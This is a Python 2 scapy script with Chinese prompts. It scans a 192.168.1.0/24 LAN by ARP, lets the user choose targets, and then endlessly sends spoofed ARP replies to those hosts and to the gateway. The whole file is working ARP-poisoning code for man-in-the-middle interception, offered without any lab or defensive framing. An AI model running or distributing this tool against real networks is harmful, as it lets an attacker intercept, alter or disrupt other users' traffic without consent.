#--*--coding=utf-8--*--

from scapy.all import *
import optparse
import threading
import sys



def getIpsMacs(LAN):
	ips = []
	macs = []
	try:
		res, unans = srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=LAN), timeout=2)
	except:
		print "[*]检查是否联网"
		sys.exit(0)
	i = 1
	for snd, rcv in res:
    		mac = rcv.sprintf("%Ether.src%")
    		ip  = rcv.sprintf("%ARP.psrc%")
		macs.append(mac)
		ips.append(ip)
		i += 1

	if(len(ips) < 2):
		print "[*]网段中的主机太少"
		sys.exit(0)
	
	return ips[0],macs[0],ips[1:],macs[1:]

def poisonTarget(srcMac,targetMac,gatewayIp,targetIp):
	pkt = Ether(src=srcMac, dst=targetMac) / ARP(hwsrc=srcMac, psrc=gatewayIp, hwdst=targetMac, pdst=targetIp, op=2)
	sendp(pkt, inter=1, iface="eth0")
	return pkt
	
def poisonGateway(srcMac,gatewayMac,gatewayIp,targetIp):
	pkt = Ether(src=srcMac, dst=gatewayMac) / ARP(hwsrc=srcMac, psrc=targetIp, hwdst=gatewayMac, pdst=gatewayIp)
	sendp(pkt, inter=1, iface="eth0")
	return pkt
	

def main(): 
	LAN = "192.168.1.0/24"
	gatewayIp,gatewayMac,ips,macs = getIpsMacs(LAN)
	
	ii = 0
    	while(ii < len(ips)):
		print str(ii)+" ===>	" + ips[ii] + ' - ' +macs[ii]
		ii += 1
    	targetIps = []
	targetMacs = []
    	interface =  "eth0"
    	srcMac = get_if_hwaddr(interface)
    	print "本机MAC地址：",srcMac
	print "网关IP地址：",gatewayIp
    	print "网关MAC地址：",gatewayMac
	print "[1]全网扫描"
	print "[2]多个扫描"
	print "[3]单个扫描"
	print "[4]离开"
    	choose = raw_input('选择模式：')
	print "选择:",type(choose)
	if(choose == "1"):
		targetIps = ips
		targetMacs = macs
		i = 0
		while(i < len(targetIps)):
			print "目标Ip地址：",targetIps[i]," - ",targetMacs[i]
			i += 1
	elif(choose == "2"):
		index = raw_input("输入要扫描的IP编号，并以','隔开:")
		index = index.split(',')
		index = [int(i) for i in index]
		for i in index:
			targetIps.append(ips[i])
			targetMacs.append(macs[i])
			print "目标IP地址：",ips[i]," - ",macs[i]
			
	elif(choose == "3"):
		index = raw_input("输入要扫描的IP编号")
		targetIps = ips[int(index)]
		targetMacs = macs[int(index)]
		print "目标IP地址：",targetIps," - ",targetMacs
	else:
	 	sys.exit(0)
	
	print "开始毒化以下",len(targetIps),"个IP："
	for ip in targetIps:
		print ip
	raw_input('按任意键开始：')

	while True:
		i = 0
    		while (i < len(targetIps)):
			targetIp = targetIps[i]
			targetMac = targetMacs[i]
    			print '[*]目标计算机Ip地址：',targetIp,"-",targetMac
       			PoisonTarget = threading.Thread(target=poisonTarget,args=(srcMac,targetMac,gatewayIp,targetIp))
        		PoisonTarget.start()
        		PoisonTarget.join()
			#print " [*]发送给计算机"+targetIp+"的ARP欺骗包"
       
      		  	PoisonGateway = threading.Thread(target=poisonGateway,args=(srcMac,gatewayMac,gatewayIp,targetIp))
        		PoisonGateway.start()
        		PoisonGateway.join()
			#print " [*]发送给网关ARP欺骗包"
        		i += 1       
        
            

if __name__ == '__main__':
    	main()
